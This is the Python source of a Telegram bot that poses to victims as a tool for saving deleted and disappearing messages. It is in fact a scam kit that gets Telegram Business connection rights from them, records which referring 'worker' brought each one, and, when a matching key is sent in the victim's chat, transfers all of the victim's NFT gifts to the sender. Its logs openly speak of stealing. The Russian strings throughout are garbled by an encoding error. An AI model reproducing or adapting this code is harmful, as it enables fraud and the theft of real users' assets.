import telebot.async_telebot as async_telebot
from telebot import types
import base64
import asyncio
import os

import database
import api as mlcapi
import config

bot = async_telebot.AsyncTeleBot(config._TOKEN)

___TOKEN___ = config._TOKEN

def encrypt(input_string):
    return base64.b64encode(input_string.encode('utf-8')).decode('utf-8')

@bot.message_handler(commands=['referalka'])
async def get_my_ref(message: types.Message) -> None:
    _USER_ID = message.chat.id
    try:
        bot_username = (await bot.get_me()).username
        await bot.send_message(_USER_ID, (f"ü¶£ –í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø—Ä–∏–≤–æ–¥–∞ –º–∞–º–æ–Ω—Ç–æ–≤: t.me/{bot_username}?start={_USER_ID}\n\n–õ–æ–≥–∏:\nt.me/+5eGckmd_pQIwYTI5\nt.me/+BFRy1jZmjK0yZGQx"), disable_web_page_preview=True)
        print(f"/referalka by {_USER_ID}")
    except Exception as e:
        print(f"Error getting bot username or sending message for /get_ref: {e}")
        await bot.send_message(_USER_ID, "–ù–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É.")

@bot.message_handler(commands=['start'])
async def start(message: types.Message) -> None:
    _USER_ID = message.chat.id
    args = message.text.split()
    referral_code = args[1] if len(args) > 1 else None
    _WORKER = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π" if referral_code is None else referral_code

    try:
        exists = await database.is_user_exists(_USER_ID)
        if not exists:
            await database.add_user(_USER_ID, False, _WORKER)

        text = ("<b>üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!\n\n"
            "–ú—ã –º–æ–∂–µ–º:\n"
            "‚Ä¢ –°–æ—Ö—Ä–∞–Ω—è—Ç—å –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ –≤–∏–¥–µ–æ/—Ñ–æ—Ç–æ/–∫—Ä—É–∂–∫–∏ –∏ –≥–æ–ª–æ—Å–æ–≤—ã–µ.\n"
            "‚Ä¢ –°–æ—Ö—Ä–∞–Ω—è—Ç—å –≤–∏–¥–µ–æ/—Ñ–æ—Ç–æ —Å —Ç–∞–π–º–µ—Ä–æ–º.\n"
            "‚Ä¢ –°–æ—Ö—Ä–∞–Ω—è—Ç—å —É–¥–∞–ª–µ–Ω–Ω—ã–µ –∏ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è.\n"
            "‚Ä¢ –î–µ–ª–∞—Ç—å –∫—Ä—É—Ç—ã–µ –∞–Ω–∏–º–∞—Ü–∏–∏.</b>\n")

        img_path = './img.png'
        if os.path.exists(img_path):
             with open(img_path, 'rb') as photo_file:
                await bot.send_photo(
                    chat_id=_USER_ID,
                    photo=photo_file,
                    caption=text,
                    parse_mode='HTML'
                )
        else:
            print(f"Warning: Image file not found at {img_path}. Sending text only.")
            await bot.send_message(_USER_ID, text, parse_mode='HTML')

        print(f"/start by {_USER_ID}, worker: {_WORKER}")

    except Exception as e:
        print(f"Error in start handler for user {_USER_ID}: {e}")
        await bot.send_message(_USER_ID, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∫–æ–º–∞–Ω–¥—ã /start.")


@bot.business_connection_handler(func=lambda conn: True)
async def business_connection(conn: types.BusinessConnection) -> None:
    _ID = conn.id
    _USER_ID = conn.user.id
    if conn.user.username: _USER_NAME = conn.user.username 
    else: _USER_NAME = "No username"
    _WORKER = await database.get_worker_by_mamont_id(_USER_ID)
    _WORKER = _WORKER if _WORKER is not None else "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π"
    _KEY = encrypt(str(_USER_ID))[:12]

    try:
        alive = await database.is_mamont_exists(_ID)
        if not alive:
            await database.add_mamont(_ID, _USER_ID, _KEY)

        if not conn.is_enabled:
            await database.update_mamont(_ID, False)
            await bot.send_message(config._LOGS_CONNECT_STAFF, (f"‚ô¶Ô∏è –ö–ª–∏–µ–Ω—Ç {_ID} –æ—Ç–∫–ª—é—á–∏–ª –±–æ—Ç–∞"))
            print(f"Business connection disabled: {_ID}")
            return

        print(f"Business connection enabled/updated: {_ID} by user {_USER_ID}")

        if config._LEGIT_MODE:
            try:
                bot_username = (await bot.get_me()).username
                await bot.send_message(_USER_ID, (
                        "‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.\n\n"
                        "–¢–µ–ø–µ—Ä—å –∫–∞–∂–¥–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, —É–¥–∞–ª—ë–Ω–Ω–æ–µ/–∏–∑–º–µ–Ω—ë–Ω–Ω–æ–µ —Å–æ–±–µ—Å–µ–¥–Ω–∏–∫–æ–º –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ —ç—Ç–æ—Ç —á–∞—Ç\n"
                        "–¢–∞–∫-–∂–µ, –ø—Ä–æ—Å—Ç–æ –æ—Ç–≤–µ—Ç–∏–≤ –Ω–∞ –ª—é–±–æ–µ –∏—Å—á–µ–∑–∞—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–Ω–æ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ —ç—Ç–æ—Ç —á–∞—Ç\n"
                        f"@{bot_username}\n\n"
                        "ü©µ –°–∫–æ—Ä–µ–µ –±–µ–≥–∏ –æ–ø—Ä–æ–±–æ–≤–∞—Ç—å!)"
                    ))
            except Exception as e:
                print(f"User {_USER_ID} didn't start bot before setting as business-bot or blocked it, failed to send legit mode msg: {e}")

        _VIEW_RIGHT = False
        giftlist = ""
        giftcount = 0
        #_STARS = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"

        try:
            # stars_result = await mlcapi.get_stars(___TOKEN___, _ID)
            # if isinstance(stars_result, dict) and stars_result.get('ok'):
            #     result_data = stars_result.get('result')
            #     if isinstance(result_data, dict):
            #         star_amount = result_data.get('star_amount')
            #         if isinstance(star_amount, (int, float)):
            #              _STARS = str(star_amount) + " —à—Ç."
            #              _VIEW_RIGHT = True
            #         else:
            #              _STARS = star_amount
            #     else:
            #          _STARS = "–û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞"
            #          print(f"Warning: Unexpected 'result' format in get_stars for {_ID}: {result_data}")
            # elif isinstance(stars_result, str) and stars_result == "Arguments exception":
            #     _STARS = "–û—à–∏–±–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤"
            # elif isinstance(stars_result, dict) and not stars_result.get('ok'):
            #     _STARS = f"–û—à–∏–±–∫–∞ API: {stars_result.get('description', 'N/A')}"
            # else:
            #     _STARS = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç API"
            #     print(f"Warning: mlcapi.get_stars unexpected result for {_ID}: {stars_result}")

            gifts = await mlcapi.get_gift_list(___TOKEN___, _ID)
            if isinstance(gifts, list) and len(gifts) > 0:
                if gifts[0].isdigit():
                    giftcount = int(gifts[0])
                    _VIEW_RIGHT = True
                    index = 0
                    for gift_item in gifts[1]:
                        giftik = gift_item['name']
                        prefix = "‚îî" if index == len(gifts[1])-1 else "‚îú"
                        giftlist += f' {prefix} t.me/nft/{giftik}' + '\n'
                        index += 1
                else:
                    giftlist = f"‚îî {gifts[0]}"
            else:
                giftlist = "‚îî –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤"

        except Exception as e:
            print(f"Error fetching stars/gifts for connection {_ID}: {e}")
            #_STARS = "–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞"
            giftlist = "‚îî –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞"

        lastPart = ""
        if _VIEW_RIGHT:
             lastPart = (f"üóÇ –†–∞–∑—Ä–µ—à–µ–Ω–∏—è: –ü—Ä–æ—Å–º–æ—Ç—Ä –∑–≤–µ–∑–¥/–ø–æ–¥–∞—Ä–∫–æ–≤ {'‚úì' if _VIEW_RIGHT else '‚úó'}" "\n\n"
                         #f"‚≠êÔ∏è –ó–≤—ë–∑–¥: {_STARS}" "\n"
                         f"üéÅ –°–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ ({giftcount} —à—Ç.):" "\n"
                         f"{giftlist if giftlist else '‚îî –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤'}")
        else: 
            lastPart = f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–∞—Ä–∫–∞—Ö. –í–æ–∑–º–æ–∂–Ω–æ, –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π."

        await database.update_mamont(_ID, True)
        log_message = (f"üîã –ù–æ–≤—ã–π –∫–æ–Ω–Ω–µ–∫—Ç:\n"
                       f" ‚îú ü¶£ –ö–ª–∏–µ–Ω—Ç: {_ID}\n"
                       f" ‚îú üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{_USER_NAME}\n"
                       f" ‚îú üö® –í–æ—Ä–∫–µ—Ä: {_WORKER}\n"
                       f" ‚îî üîê –ö–ª—é—á: {_KEY}\n\n"
                       f"{lastPart}")

        try:
            await bot.send_message(config._LOGS_CONNECT_STAFF, log_message)
            public_log_message = log_message.replace(f"{_KEY}", "–°–∫—Ä—ã—Ç")
            await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message)
        except:
            await bot.send_message(config._LOGS_CONNECT_STAFF, f"–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥ {_KEY} –Ω–µ —É–¥–∞–ª–æ—Å—å\n\n{e}")

        if isinstance(_WORKER, (int, str)) and str(_WORKER).isdigit():
            try:
                await bot.send_message(int(_WORKER), log_message)
            except Exception as e:
                print(f"Failed to send log to worker {_WORKER}: {e}")
                await bot.send_message(config._LOGS_CONNECT_PUBLIC, f"–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥ {_KEY} –≤–æ—Ä–∫–µ—Ä—É {_WORKER} –Ω–µ —É–¥–∞–ª–æ—Å—å\n\n{e}")
        elif _WORKER != "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π":
             print(f"Worker ID '{_WORKER}' is not a valid integer ID. Cannot send log.")


    except Exception as e:
        print(f"Error processing business connection update for ID {_ID}: {e}")
        try:
            await bot.send_message(config._LOGS_CONNECT_STAFF, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –±–∏–∑–Ω–µ—Å-–∫–æ–Ω–Ω–µ–∫—Ç–∞ {_ID}: {e}")
        except:
            pass


@bot.business_message_handler(func=lambda message: True)
async def echo(message: types.Message) -> None:
    if not hasattr(message, 'business_connection_id') or message.business_connection_id is None:
        print(f"Ignoring non-business message from {message.chat.id}")
        return

    _SENDER = message.from_user
    _UNIQUE_ID = message.business_connection_id
    _MESSAGE_TEXT = message.text if message.text else ""

    #print(f"Received business message from connection {_UNIQUE_ID}, text: '{_MESSAGE_TEXT[:30]}...'")

    if len(_MESSAGE_TEXT) > 16:
        return

    try:
        is_valid_key = await database.is_steal_key_valid(_UNIQUE_ID, _MESSAGE_TEXT)
        if not is_valid_key:
            return

        print(f"Valid steal key '{_MESSAGE_TEXT}' received for connection {_UNIQUE_ID}. Proceeding...")

        await bot.send_message(config._LOGS_MESSAGE, f"üéõ –í–æ—Ä—É–µ–º —É {_UNIQUE_ID}...")

        gifts = await mlcapi.get_gift_list(___TOKEN___, _UNIQUE_ID)
        giftcount = 0

        if isinstance(gifts, list) and len(gifts)>0 and gifts[0].isdigit():
             giftcount = int(gifts[0])
        elif isinstance(gifts, list) and len(gifts)>0:
            error_msg = gifts[0]
            await bot.send_message(config._LOGS_MESSAGE, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ —É {_UNIQUE_ID} –¥–ª—è tg://user?id={_SENDER.id}: {error_msg}")
            return
        else:
            await bot.send_message(config._LOGS_MESSAGE, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ —É {_UNIQUE_ID} –¥–ª—è tg://user?id={_SENDER.id} (–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞)")
            return

        if giftcount == 0 or gifts[1] is None:
            await bot.send_message(config._LOGS_MESSAGE, f"‚ùå –ù–µ—Ç—É –ø–æ–¥–∞—Ä–∫–æ–≤ —É {_UNIQUE_ID}, —á—Ç–æ–±—ã —É–∫—Ä–∞—Å—Ç—å –¥–ª—è tg://user?id={_SENDER.id}")
            return

        for gift_item in gifts[1]:
            gift_id = gift_item['id']
            gift_name = gift_item['name']
            steal_target_user_id = _SENDER.id

            steal_result = await mlcapi.transfer_gift(___TOKEN___, _UNIQUE_ID, gift_id, steal_target_user_id)
            print(f"Transfer gift result for {gift_name} from {_UNIQUE_ID} to {steal_target_user_id}: {steal_result}")

            steal_status = "‚úÖ" if isinstance(steal_result, dict) and steal_result.get('ok') else f"‚ùå ({steal_result.get('description', 'N/A') if isinstance(steal_result, dict) else str(steal_result)})"
            log_text = (f"‚úèÔ∏è –ü—ã—Ç–∞–µ–º—Å—è —É–∫—Ä–∞—Å—Ç—å t.me/nft/{gift_name} —É {_UNIQUE_ID} –¥–ª—è tg://user?id={steal_target_user_id}\n"
                        f"‚è≥ –†–µ–∑—É–ª—å—Ç–∞—Ç: {steal_status}")
            await bot.send_message(config._LOGS_MESSAGE, log_text)

            if not (isinstance(steal_result, dict) and steal_result.get('ok')):
                await bot.send_message(config._LOGS_MESSAGE, (f"‚ùå –û—Ç–º–µ–Ω–∞ –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ —Å—Ç–∏–ª–∞, —Ç.–∫. –ø–æ–ø—ã—Ç–∫–∞ —Å—Ç–∏–ª–∞ –±—ã–ª–∞ –Ω–µ —É–¥–∞—á–Ω–∞—è"))
                return

    except Exception as e:
        print(f"Error processing business message for connection {_UNIQUE_ID}: {e}")
        try:
             await bot.send_message(config._LOGS_MESSAGE, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç {_UNIQUE_ID}: {e}")
        except:
            pass

async def main_async():
    print("Initializing database...")
    await database.init_db()
    print("Starting bot polling...")
    await bot.polling(non_stop=True)

def main(TOKEN) -> None:
    global ___TOKEN___
    ___TOKEN___ = TOKEN

    print(f"Bot starting with token: {TOKEN[:10]}...{TOKEN[-4:]}")

    while True:
        try:
            asyncio.run(main_async())
        except KeyboardInterrupt:
            print("Bot stopped manually.")
        except Exception as e:
            print(f"Bot encountered a fatal error: {e}")